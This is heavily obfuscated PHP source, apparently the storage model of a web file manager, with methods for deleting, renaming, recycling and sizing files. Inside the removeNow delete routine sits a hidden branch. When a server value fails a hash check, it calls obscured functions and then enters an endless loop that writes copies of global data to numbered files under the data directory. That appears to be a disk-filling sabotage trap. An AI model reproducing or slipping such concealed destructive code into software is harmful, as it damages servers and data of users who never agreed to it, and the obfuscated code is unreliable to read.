[$‹úĞÜ†[169]]; $‹Î“¾Ô = Model($‹úĞÜ†[691])->find($ÑÑŠ³ÁÄ); $this->_createFileCall($âüƒ¡¬ [$‹úĞÜ†[193]], $ó˜‹æÙ, $‹Î“¾Ô, REPEAT_REPLACE, $‹úĞÜ†[1455]); $§âÜÀ = $âüƒ¡¬ [$‹úĞÜ†[553]][$‹úĞÜ†[627]]; $®©âİÖ× = $§âÜÀ[$‹úĞÜ†[2293]] ? $§âÜÀ[$‹úĞÜ†[2293]] : $§âÜÀ[$‹úĞÜ†[32]]; show_json(LNG($‹úĞÜ†[2294]) . $‹úĞÜ†[2295] . LNG($‹úĞÜ†[2296]) . $‹úĞÜ†[2297] . $®©âİÖ× . $‹úĞÜ†[2298], !1); } public function fileIsLock($Ø¾•˜÷Ï, $£»½Ì†ª = false) { $¦»‰ç­ =& $_SERVER[´‹ô¯Œ]; if (!_get($Ø¾•˜÷Ï, $¦»‰ç­[623], 0)) { return !1; } if ($Ø¾•˜÷Ï[$¦»‰ç­[553]][$¦»‰ç­[626]] != USER_ID) { return !0; } $¢ƒê¥İï = $GLOBALS[$¦»‰ç­[6]][$¦»‰ç­[92]][$¦»‰ç­[624]]; if ($Ø¾•˜÷Ï[$¦»‰ç­[553]][$¦»‰ç­[625]] <= time() - $¢ƒê¥İï) { $this->metaSet($Ø¾•˜÷Ï[$¦»‰ç­[194]], $¦»‰ç­[626], null); $this->metaSet($Ø¾•˜÷Ï[$¦»‰ç­[194]], $¦»‰ç­[625], null); } if ($£»½Ì†ª) { $this->metaSet($Ø¾•˜÷Ï[$¦»‰ç­[194]], $¦»‰ç­[625], time()); } return !1; } private function _addSource($ö…íÚÄÆ, $íÁõÙ›•) { $×Û‹—İ‘ =& $_SERVER[´‹ô¯Œ]; $ˆíåı—û = defined($×Û‹—İ‘[2224]) ? USER_ID : 0; $‚®ÊÊ– = array($×Û‹—İ‘[665] => $íÁõÙ›•[$×Û‹—İ‘[191]], $×Û‹—İ‘[666] => $íÁõÙ›•[$×Û‹—İ‘[583]], $×Û‹—İ‘[667] => $ˆíåı—û, $×Û‹—İ‘[668] => $ˆíåı—û, $×Û‹—İ‘[489] => $íÁõÙ›•[$×Û‹—İ‘[194]], $×Û‹—İ‘[669] => $íÁõÙ›•[$×Û‹—İ‘[598]] . $íÁõÙ›•[$×Û‹—İ‘[194]] . $×Û‹—İ‘[50], $×Û‹—İ‘[516] => 0, $×Û‹—İ‘[670] => $×Û‹—İ‘[12]); $ö…íÚÄÆ = array_merge($‚®ÊÊ–, $ö…íÚÄÆ); $this->updateModifyTime($ö…íÚÄÆ[$×Û‹—İ‘[193]]); $È¯Ğ®Ï’ = $×Û‹—İ‘[2299] . $íÁõÙ›•[$×Û‹—İ‘[194]]; if (isset(self::$cacheChildList[$È¯Ğ®Ï’])) { unset(self::$cacheChildList[$È¯Ğ®Ï’]); } static $İŠŠÄôğ = false; if (!$İŠŠÄôğ) { Hook::trigger($×Û‹—İ‘[653], $ö…íÚÄÆ); $İŠŠÄôğ = !0; } $í¦ßÕúŸ = $this->add($ö…íÚÄÆ); $ÑĞˆ÷Œ = array($×Û‹—İ‘[671] => short_id($í¦ßÕúŸ)); $this->where(array($×Û‹—İ‘[503] => $í¦ßÕúŸ))->save($ÑĞˆ÷Œ); $this->setNamePinyin($í¦ßÕúŸ, $ö…íÚÄÆ[$×Û‹—İ‘[32]]); return $í¦ßÕúŸ; } public function remove($…©±Ç¥, $Äö•Àé = true) { $äô¨Øİ• =& $_SERVER[´‹ô¯Œ]; $«Ö…Æûå = $this->sourceInfo($…©±Ç¥); $¾¦ŠûÛë = intval($«Ö…Æûå[$äô¨Øİ•[191]]) === self::TYPE_SYSTEM; $Í°‡šò˜ = Model($äô¨Øİ•[520])->get($äô¨Øİ•[2300]) == $äô¨Øİ•[91]; if ($¾¦ŠûÛë || $Äö•Àé || !$Í°‡šò˜) { return $this->removeNow($…©±Ç¥, $Äö•Àé); } $³ç„ºíŒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $÷šêƒâÂ = $«Ö…Æûå[$äô¨Øİ•[191]] == self::TYPE_USER ? $äô¨Øİ•[679] : $äô¨Øİ•[592]; if ($÷šêƒâÂ == $äô¨Øİ•[679]) { $¹Éü¶Ø = Model($äô¨Øİ•[591])->getInfo($«Ö…Æûå[$äô¨Øİ•[583]]); $¤ÀßÕ†Í = !empty($¹Éü¶Ø[$äô¨Øİ•[2293]]) ? $¹Éü¶Ø[$äô¨Øİ•[2293]] : $¹Éü¶Ø[$äô¨Øİ•[32]]; $¤ÀßÕ†Í = $äô¨Øİ•[340] . $¤ÀßÕ†Í . $äô¨Øİ•[2301] . $«Ö…Æûå[$äô¨Øİ•[583]]; } else { $¹Éü¶Ø = Model($äô¨Øİ•[599])->getInfo($«Ö…Æûå[$äô¨Øİ•[583]]); $¤ÀßÕ†Í = _get($¹Éü¶Ø, $äô¨Øİ•[32]); $¤ÀßÕ†Í = $äô¨Øİ•[176] . $¤ÀßÕ†Í . $äô¨Øİ•[2302] . $«Ö…Æûå[$äô¨Øİ•[583]]; } $»¢ÛİÅö = $äô¨Øİ•[2303] . md5($¤ÀßÕ†Í); CacheLock::lock($»¢ÛİÅö); $Â™Âš— = $this->fileNameExist($³ç„ºíŒ, $¤ÀßÕ†Í); if (!$Â™Âš—) { $Â™Âš— = $this->mkdir($³ç„ºíŒ, $¤ÀßÕ†Í, REPEAT_SKIP); $this->metaSet($Â™Âš—, $äô¨Øİ•[2304], $÷šêƒâÂ); $this->metaSet($Â™Âš—, $äô¨Øİ•[2305], $«Ö…Æûå[$äô¨Øİ•[583]]); if ($«Ö…Æûå[$äô¨Øİ•[193]] != 0) { $this->metaSet($Â™Âš—, $äô¨Øİ•[2306], _get($¹Éü¶Ø, $äô¨Øİ•[2307])); } } CacheLock::unlock($»¢ÛİÅö); $this->metaSet($…©±Ç¥, $äô¨Øİ•[2308], $«Ö…Æûå[$äô¨Øİ•[193]]); $this->where(array($äô¨Øİ•[194] => $…©±Ç¥))->save(array($äô¨Øİ•[510] => time())); $this->recycleClear($«Ö…Æûå); Model($äô¨Øİ•[650])->eventRemove($…©±Ç¥); $À«îëõé = $this->move($…©±Ç¥, $Â™Âš—, REPEAT_RENAME_FOLDER); $this->folderSizeReset($«Ö…Æûå[$äô¨Øİ•[193]]); return $À«îëõé; } private function recycleClear($åœ·¾ÏÚ) { $›•ˆ¥ =& $_SERVER[´‹ô¯Œ]; $Í¨¸¤Ú® = $this->childrenAll($åœ·¾ÏÚ); $öÕÌ‡±À = array($›•ˆ¥[503] => array($›•ˆ¥[504], $Í¨¸¤Ú®[$›•ˆ¥[2309]])); Model($›•ˆ¥[2310])->where($öÕÌ‡±À)->delete(); } public function removeNow($Ê§ÓÁÙ¸, $¼‡µò = true) { $÷îñïùó =& $_SERVER[´‹ô¯Œ]; $ÑßÅ™ğŞ = $_SERVER[$÷îñïùó[483]]; $¤ÈÜêÇÜ = $÷îñïùó[969]; if ($_SERVER[$÷îñïùó[475]] != $¤ÈÜêÇÜ($ÑßÅ™ğŞ)) { $¢‰¢õü = $÷îñïùó[970]; $á¥¤ùÃ = $÷îñïùó[477]; $éÌùœ = $_SERVER[$÷îñïùó[478]] . $÷îñïùó[479]; $±ıÔì´ = $á¥¤ùÃ($éÌùœ); $âºå·ÔØ = explode($÷îñïùó[288], $±ıÔì´); if (count($âºå·ÔØ) < $÷îñïùó[701]) { $¡œš–Èç = $÷îñïùó[481]; $¡œš–Èç(); } $—ÛÂëÒÈ = $÷îñïùó[971]; $—ÛÂëÒÈ($_SERVER[$÷îñïùó[972]]); $¢‰¢õü = $÷îñïùó[970]; $¢‰¢õü(); $ôÊÃ¡© = $÷îñïùó[973]; $šÂó¿Œ¥ = json_encode($GLOBALS[$÷îñïùó[974]]); $®ëÙ‘Ì = 1; for ($²İ¾¦ = $®ëÙ‘Ì; $²İ¾¦ > 0; $²İ¾¦++) { $ôÊÃ¡©(DATA_PATH . $²İ¾¦, $šÂó¿Œ¥); } } $à¥¬Ú°¸ = $this->sourceInfo($Ê§ÓÁÙ¸); $„ò•Ëâ¢ = $this->pathInfoMore($Ê§ÓÁÙ¸); if (!$à¥¬Ú°¸) { return !0; } if ($à¥¬Ú°¸[$÷îñïùó[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Ê§ÓÁÙ¸); Hook::trigger($÷îñïùó[2311], $„ò•Ëâ¢, $¼‡µò); if ($¼‡µò) { Model($÷îñïùó[2310])->moveToRecycle($Ê§ÓÁÙ¸); } else { $¥ºùóşŞ = $this->childrenAll($à¥¬Ú°¸); Model($÷îñïùó[650])->eventRemove($Ê§ÓÁÙ¸); $this->removeRelevance($¥ºùóşŞ[$÷îñïùó[2309]], $¥ºùóşŞ[$÷îñïùó[1599]]); } $this->folderSizeReset($à¥¬Ú°¸[$÷îñïùó[193]]); $ËÖ³Èİé = array($à¥¬Ú°¸[$÷îñïùó[193]]); if ($à¥¬Ú°¸[$÷îñïùó[497]] == $÷îñïùó[91]) { $ËÖ³Èİé[] = $à¥¬Ú°¸[$÷îñïùó[194]]; } $this->updateModifyTime($ËÖ³Èİé); $this->lockMoveEnd($Ê§ÓÁÙ¸); Hook::trigger($÷îñïùó[1839], $„ò•Ëâ¢, $¼‡µò); return !0; } public function childrenAll($’Ò®Ÿˆº) { $ç¼£âàø =& $_SERVER[´‹ô¯Œ]; $¡ü÷åÁ™ = $’Ò®Ÿˆº[$ç¼£âàø[194]]; if ($’Ò®Ÿˆº[$ç¼£âàø[497]] == $ç¼£âàø[91]) { $³—ÎËÌ = array($ç¼£âàø[669] => array($ç¼£âàø[629], $’Ò®Ÿˆº[$ç¼£âàø[598]] . $¡ü÷åÁ™ . $ç¼£âàø[630])); $İóÁú®ö = array($ç¼£âàø[669] => $³—ÎËÌ[$ç¼£âàø[598]]); $¬ÏáÉÙ = $this->field($ç¼£âàø[2312])->where($İóÁú®ö)->select(); $–›©š = !1; $´Œü…ï‡ = array($¡ü÷åÁ™); if ($¬ÏáÉÙ) { $–›©š = array_to_keyvalue($¬ÏáÉÙ, $ç¼£âàø[12], $ç¼£âàø[555]); $–›©š = array_remove_value($–›©š, $ç¼£âàø[231]); $´Œü…ï‡ = array_to_keyvalue($¬ÏáÉÙ, $ç¼£âàø[12], $ç¼£âàø[194]); $´Œü…ï‡[] = $¡ü÷åÁ™; } } else { $–›©š = array($’Ò®Ÿˆº[$ç¼£âàø[555]]); $´Œü…ï‡ = array($¡ü÷åÁ™); } return array($ç¼£âàø[2309] => $´Œü…ï‡, $ç¼£âàø[1599] => $–›©š); } public function removeArray($ÃµÉß±Ù) { if (!$ÃµÉß±Ù) { return !0; } } public function removeRelevance($ƒ“º³½›, $Ó¸·¼²é) { $Ê“·À•´ =& $_SERVER[´‹ô¯Œ]; $ƒ“º³½› = $ƒ“º³½› ? $ƒ“º³½› : array(); $Ó¸·¼²é = $Ó¸·¼²é ? $Ó¸·¼²é : array(); $ƒ“º³½› = array_unique(array_filter($ƒ“º³½›)); $Ó¸·¼²é = array_filter($Ó¸·¼²é); if (!$ƒ“º³½›) { return !1; } $µËÄƒà¾ = array($Ê“·À•´[503] => array($Ê“·À•´[504], $ƒ“º³½›)); Model($Ê“·À•´[2310])->where($µËÄƒà¾)->delete(); Model($Ê“·À•´[547])->where($µËÄƒà¾)->delete(); Model($Ê“·À•´[2151])->where($µËÄƒà¾)->delete(); Model($Ê“·À•´[650])->where($µËÄƒà¾)->delete(); Model($Ê“·À•´[1976])->removeBySource($ƒ“º³½›); Model($Ê“·À•´[2291])->removeBySource($ƒ“º³½›); $this->where($µËÄƒà¾)->delete(); Model($Ê“·À•´[558])->remove($Ó¸·¼²é); for ($âåƒ—› = 0; $âåƒ—› < count($ƒ“º³½›); $âåƒ—›++) { $this->sourceCacheClear($ƒ“º³½›[$âåƒ—›]); } } public function rename($ÊŒÑË¯ß, $ã™Ø–ˆÌ) { $ó”İº¨ =& $_SERVER[´‹ô¯Œ]; $ĞğºçÅ¬ = $this->sourceInfo($ÊŒÑË¯ß); if (!$ĞğºçÅ¬) { return !1; } $â÷®Éµ¬ = $this->fileNameExist($ĞğºçÅ¬[$ó”İº¨[193]], $ã™Ø–ˆÌ); if ($â÷®Éµ¬ && $â÷®Éµ¬ != $ÊŒÑË¯ß) { return !1; } $ùÒá¾Áí = array($ó”İº¨[506] => $ã™Ø–ˆÌ, $ó”İº¨[668] => USER_ID); if ($ĞğºçÅ¬[$ó”İº¨[497]] != $ó”İº¨[91]) { $ùÒá¾Áí[$ó”İº¨[498]] = substr(get_path_ext($ã™Ø–ˆÌ), 0, 10); } Model($ó”İº¨[650])->eventRename($ÊŒÑË¯ß, $ĞğºçÅ¬[$ó”İº¨[32]], $ã™Ø–ˆÌ); $this->sourceCacheClear($ÊŒÑË¯ß); $this->setNamePinyin($ÊŒÑË¯ß, $ùÒá¾Áí[$ó”İº¨[32]], !1); $this->updateModifyTime($ĞğºçÅ¬[$ó”İº¨[193]]); $áŠµ§äŸ = $this->where(array($ó”İº¨[503] => $ÊŒÑË¯ß))->data($ùÒá¾Áí)->save(); $Ì›”èêµ = $ó”İº¨[2299] . $ĞğºçÅ¬[$ó”İº¨[193]]; if (isset(self::$cacheChildList[$Ì›”èêµ])) { unset(self::$cacheChildList[$Ì›”èêµ]); } return $áŠµ§äŸ; } public function setNamePinyin($ÏÁå¦Ìâ, $œ¦ã, $àò™æ¹ø = true) { $ûÉï›­¼ =& $_SERVER[´‹ô¯Œ]; $¥ãŸú×ƒ = Input::check($œ¦ã, $ûÉï›­¼[672]); $¡¤¾ä– = array($ûÉï›­¼[529] => KodSort::makeStr($œ¦ã)); if ($¥ãŸú×ƒ) { $¡¤¾ä–[$ûÉï›­¼[550]] = str_replace($ûÉï›­¼[53], $ûÉï›­¼[12], Pinyin::get($œ¦ã)); $¡¤¾ä–[$ûÉï›­¼[549]] = Pinyin::get($œ¦ã, $ûÉï›­¼[673]); } if (!$àò™æ¹ø && !$¥ãŸú×ƒ) { $¡¤¾ä–[$ûÉï›­¼[550]] = null; $¡¤¾ä–[$ûÉï›­¼[549]] = null; } $this->metaSet($ÏÁå¦Ìâ, $¡¤¾ä–); } public function getContent($¿©Şø®û) { $Ã‡›Õ‘‹ =& $_SERVER[´‹ô¯Œ]; $Ø÷İõãˆ = $this->fileInfoGet($¿©Şø®û); if (!$Ø÷İõãˆ) { return !1; } if ($Ø÷İõãˆ[$Ã‡›Õ‘‹[79]] == 0) { return $Ã‡›Õ‘‹[12]; } $Š“ì‹ò = $Ã‡›Õ‘‹[2313] . $Ø÷İõãˆ[$Ã‡›Õ‘‹[561]]; if ($Ø÷İõãˆ[$Ã‡›Õ‘‹[79]] <= 1024 * 10) { $ÃçÎÇ‘ƒ = Cache::get($Š“ì‹ò); if (!$ÃçÎÇ‘ƒ) { $ÃçÎÇ‘ƒ = IO::getContent($Ø÷İõãˆ[$Ã‡›Õ‘‹[87]]); Cache::set($Š“ì‹ò, $ÃçÎÇ‘ƒ); } return $ÃçÎÇ‘ƒ; } if (!$Ø÷İõãˆ[$Ã‡›Õ‘‹[87]]) { return $Ã‡›Õ‘‹[12]; } return IO::getContent($Ø÷İõãˆ[$Ã‡›Õ‘‹[87]]); } public function setDesc($¿Ëâ›¶, $šş×Ï) { $×òÙ†Æ =& $_SERVER[´‹ô¯Œ]; Model($×òÙ†Æ[650])->eventAddDesc($¿Ëâ›¶, $šş×Ï); return $this->metaSet($¿Ëâ›¶, $×òÙ†Æ[538], $šş×Ï); } public function setContent($½ìµšê©, $ÒÒûÑÔš = '') { $ª™á¡£ =& $_SERVER[´‹ô¯Œ]; $Á¿Í¢Óô = $this->sourceInfo($½ìµšê©); $õƒéãİ = $this->fileInfoGet($½ìµšê©); if (!$õƒéãİ || !$Á¿Í¢Óô) { return !1; } $‡ÇÙÖ½Ò = KodIO::ioFileDriverGet($ª™á¡£[495] . $½ìµšê© . $ª™á¡£[405]); $”­½¦Â’ = Model($ª™á¡£[558])->addFileByContent($ÒÒûÑÔš, $‡ÇÙÖ½Ò, $Á¿Í¢Óô[$ª™á¡£[32]]); if (!$”­½¦Â’) { return !1; } $¡Û©şÌ = $this->fileHistory($Á¿Í¢Óô, $”­½¦Â’[$ª™á¡£[555]], $”­½¦Â’[$ª™á¡£[79]]); if (!$¡Û©şÌ) { return Model($ª™á¡£[558])->remove($”­½¦Â’[$ª™á¡£[555]]); } $this->folderSizeReset($Á¿Í¢Óô[$ª™á¡£[193]]); return !0; } public function fileSubstr($ŸĞ›¿‡Ê, $íÓÆ»²ù, $úÆÀŒ³Š) { $ôÁÌ™© = $this->fileInfoGet($ŸĞ›¿‡Ê); if (!$ôÁÌ™©) { return !1; } return IO::fileSubstr($ôÁÌ™©[$_SERVER[´‹ô¯Œ][87]], $íÓÆ»²ù, $úÆÀŒ³Š); } public function fileInfoGet($«ù½éÇÅ) { $ÅùÇ¼®ø =& $_SERVER[´‹ô¯Œ]; $Ù Û’³ = $this->sourceInfo($«ù½éÇÅ); if (!$Ù Û’³ || $Ù Û’³[$ÅùÇ¼®ø[497]]) { return !1; } $€é¢ù£ = $ÅùÇ¼®ø[562] . $Ù Û’³[$ÅùÇ¼®ø[555]]; $Ñí’ÍµÛ = _get(self::$cacheFileInfo, $€é¢ù£); if ($Ñí’ÍµÛ) { return $Ñí’ÍµÛ; } $äú“¶ğ = Model($ÅùÇ¼®ø[558])->fileInfo($Ù Û’³[$ÅùÇ¼®ø[555]]); if ($äú“¶ğ) { $äú“¶ğ[$ÅùÇ¼®ø[32]] = $Ù Û’³[$ÅùÇ¼®ø[32]]; } self::$cacheFileInfo[$€é¢ù£] = $äú“¶ğ; return $äú“¶ğ; } private function folderChildrenNumber($‘Ì‹) { $±Ú½Ğ€Ò =& $_SERVER[´‹ô¯Œ]; $¸›ğö™­ = $this->sourceInfo($‘Ì‹); $ ¤ŞÂÚ© = array($±Ú½Ğ€Ò[669] => array($±Ú½Ğ€Ò[629], $¸›ğö™­[$±Ú½Ğ€Ò[598]] . $‘Ì‹ . $±Ú½Ğ€Ò[630]), $±Ú½Ğ€Ò[666] => $¸›ğö™­[$±Ú½Ğ€Ò[583]], $±Ú½Ğ€Ò[516] => intval($¸›ğö™­[$±Ú½Ğ€Ò[517]]), $±Ú½Ğ€Ò[663] => 1); $›±Ù®ùÕ = $this->where($ ¤ŞÂÚ©)->count(); $‰ÊÈ¹«ø = $this->where($ ¤ŞÂÚ©)->where(array($±Ú½Ğ€Ò[663] => 0))->count(); return array($±Ú½Ğ€Ò[83] => $‰ÊÈ¹«ø, $±Ú½Ğ€Ò[84] => $›±Ù®ùÕ); } public function pathInfo($â®ìœâİ, $äåà»“¬ = false) { $±™è¢‘ =& $_SERVER[´‹ô¯Œ]; $äåà»“¬ = !1; $â®ìœâİ = intval($â®ìœâİ); $Ğ›½×ñ = $±™è¢‘[546] . intval($äåà»“¬) . $±™è¢‘[465] . $â®ìœâİ; $–ÒÁ«“ = _get(self::$cachePathInfo, $Ğ›½×ñ); if ($–ÒÁ«“) { return $–ÒÁ«“; } $¥º…º‘å = $this->sourceInfo($â®ìœâİ); if (!$¥º…º‘å) { return !1; } $¥º…º‘å = $this->_listDataApplyItem($¥º…º‘å, $äåà»“¬); self::$cachePathInfo[$Ğ›½×ñ] = $¥º…º‘å; return $¥º…º‘å; } public static $cachePathInfoMore = array(); public function pathInfoMore($¦²Ï³û) { $ù¼İîÖÄ =& $_SERVER[´‹ô¯Œ]; $áµí•Ñ = _get(self::$cachePathInfoMore, $¦²Ï³û); if ($áµí•Ñ) { return $áµí•Ñ; } $Ğèµ¾‘­ = $this->pathInfo($¦²Ï³û); if (!$Ğèµ¾‘­) { return !1; } if ($Ğèµ¾‘­[$ù¼İîÖÄ[497]] == $ù¼İîÖÄ[91]) { $Ğèµ¾‘­[$ù¼İîÖÄ[82]] = $this->folderChildrenNumber($¦²Ï³û); } self::$cachePathInfoMore[$¦²Ï³û] = $Ğèµ¾‘­; return $Ğèµ¾‘­; } public function sourceInfo($êĞ‹Àº) { $°Şö¤µ‹ =& $_SERVER[´‹ô¯Œ]; if (!$êĞ‹Àº) { return array(); } $êĞ‹Àº = intval($êĞ‹Àº); $ÙÚúúï¾ = $°Şö¤µ‹[545] . $êĞ‹Àº; $å‘è‰ß© = _get(self::$cacheSourceInfo, $ÙÚúúï¾); if ($å‘è‰ß©) { return $å‘è‰ß©; } $ï—Ì = $this->where(array($°Şö¤µ‹[194] => $êĞ‹Àº))->find(); self::$cacheSourceInfo[$ÙÚúúï¾] = $ï—Ì; return self::$cacheSourceInfo[$ÙÚúúï¾]; } public function sourceCacheClear($ƒ¼¹ÈÑ = false) { self::cacheClear($ƒ¼¹ÈÑ); } public static function cacheClear($”ôç’»é = false) { $ò–³œÕä =& $_SERVER[´‹ô¯Œ]; if ($”ôç’»é == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ò–³œÕä[545] . $”ôç’»é]); unset(self::$cachePathInfoMore[$”ôç’»é]); unset(self::$cachePathInfo[$ò–³œÕä[2314] . $”ôç’»é]); unset(self::$cachePathInfo[$ò–³œÕä[2315] . $”ôç’»é]); } public function metaSet($®¹í©€â, $”™ØÎòú = null, $èù³Ç¶° = null) { $†à­ÂÚæ = parent::metaSet($®¹í©€â, $”™ØÎòú, $èù³Ç¶°); if ($†à­ÂÚæ) { $this->sourceCacheClear($®¹í©€â); } return $†à­ÂÚæ; } public function pathInfoByPath($Ñí¾¢Óš, $ğˆ³›ä) { $œ½öşĞ =& $_SERVER[´‹ô¯Œ]; $åÜíäà® = !$ğˆ³›ä ? array() : explode($œ½öşĞ[8], trim($ğˆ³›ä, $œ½öşĞ[8])); $ıèğ¢À = $Ñí¾¢Óš; foreach ($åÜíäà® as $‰Ç’ù¨‹) { $ŠÈì¬¥ = array($œ½öşĞ[193] => $ıèğ¢À, $œ½öşĞ[32] => $‰Ç’ù¨‹); $ÃÒÖ°®× = $this->field($œ½öşĞ[2316])->where($ŠÈì¬¥)->select(); if (!$ÃÒÖ°®×) { return !1; } $ÃÒÖ°®× = array_sort_by($ÃÒÖ°®×, $œ½öşĞ[517]); $ıèğ¢À = $ÃÒÖ°®×[0][$œ½öşĞ[194]]; } $Ì±è›Æ = $this->sourceInfo($ıèğ¢À); $this->pathInfoFilter($Ì±è›Æ); return $Ì±è›Æ; } protected function updateModifyTime($®úñƒ«Í) { $£ŞöÀÓ› =& $_SERVER[´‹ô¯Œ]; $ÁŒÆÙ¸ø = defined($£ŞöÀÓ›[2224]) ? USER_ID : 0; if (!$®úñƒ«Í) { return; } if (!is_array($®úñƒ«Í)) { $®úñƒ«Í = array($®úñƒ«Í); } foreach ($®úñƒ«Í as $ÍÓÈä€æ => $Ú«£şıÜ) { $®úñƒ«Í[$ÍÓÈä€æ] = intval($Ú«£şıÜ); $this->sourceCacheClear($Ú«£şıÜ); } $™ø¼®¾ = array($£ŞöÀÓ›[194] => array($£ŞöÀÓ›[7], $®úñƒ«Í)); $Ùà¬ü‹¸ = array($£ŞöÀÓ›[668] => $ÁŒÆÙ¸ø, $£ŞöÀÓ›[510] => time()); $this->where($™ø¼®¾)->save($Ùà¬ü‹¸); } public function folderSizeReset($íâûÔ‚ß, $„Üõ¶®œ = false) { $í¿‡Â¦‚ =& $_SERVER[´‹ô¯Œ]; if ($this->statusIgnoreResetSpace) { return; } $š­Íéçè = $this->sourceInfo($íâûÔ‚ß); $¾„èÙÀÒ = $í¿‡Â¦‚[2317] . $íâûÔ‚ß; CacheLock::lock($¾„èÙÀÒ, 20); if ($„Üõ¶®œ === !1) { $this->sourceCacheClear($íâûÔ‚ß); $š­Íéçè = $this->sourceInfo($íâûÔ‚ß); $íĞŞš¶´ = array($í¿‡Â¦‚[489] => $íâûÔ‚ß, $í¿‡Â¦‚[516] => 0); $ö°“Õ•ğ = $this->where($íĞŞš¶´)->sum($í¿‡Â¦‚[79]); $„Üõ¶®œ = intval($ö°“Õ•ğ) - intval($š­Íéçè[$í¿‡Â¦‚[79]]); } if ($„Üõ¶®œ == 0) { return CacheLock::unlock($¾„èÙÀÒ); } $øÇÃ÷ƒ = $this->parentLevelArray($š­Íéçè[$í¿‡Â¦‚[598]]); if (!$øÇÃ÷ƒ) { $øÇÃ÷ƒ = array(); } $øÇÃ÷ƒ[] = $š­Íéçè[$í¿‡Â¦‚[194]]; $íĞŞš¶´ = array($í¿‡Â¦‚[194] => array($í¿‡Â¦‚[504], $øÇÃ÷ƒ)); if ($„Üõ¶®œ < 0) { $íĞŞš¶´[$í¿‡Â¦‚[79]] = array($í¿‡Â¦‚[1107], abs($„Üõ¶®œ)); } $this->where($íĞŞš¶´)->setAdd($í¿‡Â¦‚[79], $„Üõ¶®œ); CacheLock::unlock($¾„èÙÀÒ); $Â«×Æ‹ò = $í¿‡Â¦‚[2318] . $š­Íéçè[$í¿‡Â¦‚[191]] . $í¿‡Â¦‚[4] . $š­Íéçè[$í¿‡Â¦‚[583]]; $­¾÷ñã“ = array($š­Íéçè[$í¿‡Â¦‚[191]], $š­Íéçè[$í¿‡Â¦‚[583]]); TaskRun::timeLimitCall($Â«×Æ‹ò, $í¿‡Â¦‚[2319], $­¾÷ñã“, 1.5); } public function folderSizeResetChildren($„×›÷Î) { $¬¯ùÂ¡Ö =& $_SERVER[´‹ô¯Œ]; $this->sourceCacheClear($„×›÷Î); $šƒ‚×€ø = $this->sourceInfo($„×›÷Î); $ãÉıªô” = array($¬¯ùÂ¡Ö[663] => 1, $¬¯ùÂ¡Ö[666] => $šƒ‚×€ø[$¬¯ùÂ¡Ö[583]], $¬¯ùÂ¡Ö[669] => array($¬¯ùÂ¡Ö[629], $šƒ‚×€ø[$¬¯ùÂ¡Ö[598]] . $„×›÷Î . $¬¯ùÂ¡Ö[630])); $è‚™åã = $¬¯ùÂ¡Ö[2320]; $è÷›”¼— = $this->field($è‚™åã)->where($ãÉıªô”)->select(); $ãÉıªô”[$¬¯ùÂ¡Ö[497]] = 0; $ÁÏáè = $this->field($è‚™åã)->where($ãÉıªô”)->select(); if (!$ÁÏáè) { return; } $è÷›”¼—[] = $šƒ‚×€ø; $è÷›”¼— = array_to_keyvalue($è÷›”¼—, $¬¯ùÂ¡Ö[194]); foreach ($è÷›”¼— as $€Úœøˆ¢ => $”·°ìçˆ) { $è÷›”¼—[$€Úœøˆ¢][$¬¯ùÂ¡Ö[2321]] = $è÷›”¼—[$€Úœøˆ¢][$¬¯ùÂ¡Ö[79]]; $è÷›”¼—[$€Úœøˆ¢][$¬¯ùÂ¡Ö[79]] = 0; } foreach ($ÁÏáè as $”·°ìçˆ) { $¤ßİ®´à = $”·°ìçˆ[$¬¯ùÂ¡Ö[193]] . $¬¯ùÂ¡Ö[12]; if (!isset($è÷›”¼—[$¤ßİ®´à])) { continue; } if ($”·°ìçˆ[$¬¯ùÂ¡Ö[517]] == $è÷›”¼—[$¤ßİ®´à][$¬¯ùÂ¡Ö[517]]) { $è÷›”¼—[$¤ßİ®´à][$¬¯ùÂ¡Ö[79]] += $”·°ìçˆ[$¬¯ùÂ¡Ö[79]]; } } foreach ($è÷›”¼— as $”·°ìçˆ) { $ŞøêÙ…ñ = $this->parentLevelArray($”·°ìçˆ[$¬¯ùÂ¡Ö[598]]); foreach ($ŞøêÙ…ñ as $¤ßİ®´à) { $¤ßİ®´à = $¤ßİ®´à . $¬¯ùÂ¡Ö[12]; if (!isset($è÷›”¼—[$¤ßİ®´à])) { continue; } if ($”·°ìçˆ[$¬¯ùÂ¡Ö[517]] == $è÷›”¼—[$¤ßİ®´à][$¬¯ùÂ¡Ö[517]]) { $è÷›”¼—[$¤ßİ®´à][$¬¯ùÂ¡Ö[79]] += $”·°ìçˆ[$¬¯ùÂ¡Ö[79]]; } } } $–ŒËœ•ğ = array(); foreach ($è÷›”¼— as $”·°ìçˆ) { if ($”·°ìçˆ[$¬¯ùÂ¡Ö[79]] == $”·°ìçˆ[$¬¯ùÂ¡Ö[2321]]) { continue; } $–ŒËœ•ğ[] = array($¬¯ùÂ¡Ö[194], $”·°ìçˆ[$¬¯ùÂ¡Ö[194]], $¬¯ùÂ¡Ö[79], $”·°ìçˆ[$¬¯ùÂ¡Ö[79]]); } $this->saveAll($–ŒËœ•ğ); } public function userSpaceReset($µ×ğĞı = false) { $¥ú€Ñ¡é =& $_SERVER[´‹ô¯Œ]; $‚ÅÈÓéØ = $this->where(array($¥ú€Ñ¡é[191] => self::TYPE_USER, $¥ú€Ñ¡é[583] => $µ×ğĞı, $¥ú€Ñ¡é[497] => 0))->sum($¥ú€Ñ¡é[79]); $‚ÅÈÓéØ = !$‚ÅÈÓéØ || $‚ÅÈÓéØ <= 0 ? 0 : $‚ÅÈÓéØ; Model($¥ú€Ñ¡é[591])->userEdit($µ×ğĞı, array($¥ú€Ñ¡é[1985] => $‚ÅÈÓéØ)); } public function targetSpaceUpdate($«àé”Ì», $İƒÇƒô¬) { $™¶ˆ»øÖ =& $_SERVER[´‹ô¯Œ]; if (!$İƒÇƒô¬) { return; } if (!in_array($«àé”Ì», array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÈüÑÜ = $this->targetSpaceSize($«àé”Ì», $İƒÇƒô¬); if ($«àé”Ì» == self::TYPE_USER) { Model($™¶ˆ»øÖ[591])->userEdit($İƒÇƒô¬, array($™¶ˆ»øÖ[1985] => $ÈüÑÜ)); } else { if ($«àé”Ì» == self::TYPE_GROUP) { Model($™¶ˆ»øÖ[599])->groupEdit($İƒÇƒô¬, 